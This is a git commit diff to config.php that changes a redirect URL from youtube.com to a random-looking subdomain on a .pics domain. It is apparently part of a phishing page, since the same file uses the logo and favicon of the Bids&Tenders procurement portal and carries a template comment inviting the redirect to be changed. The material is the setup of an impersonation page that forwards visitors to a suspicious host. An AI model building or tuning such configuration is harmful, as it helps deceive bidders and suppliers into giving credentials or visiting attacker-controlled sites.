77c22fc93a58db0a2dbff63200cc475369d4e4cc
pwcsuper111 <pwcsuper111@gmail.com>
2026-06-16 03:03:00 -0700

    Update config.php

--- config.php
+++ config.php
@@ -4,4 +4,4 @@ define('LOGO_URL', 'https://bids.bidsandtenders.ca/Resources/content/StandardTem
 define('FAVICON_URL', 'https://bids.bidsandtenders.ca/Resources/content/StandardTemplate/favicons/favicon-32x32.png');
 
 // ===== CHANGE YOUR REDIRECT URL HERE =====
-define('REDIRECT_URL', 'https://youtube.com');
+define('REDIRECT_URL', 'https://dreur9saiu.rillenrisc.pics/');
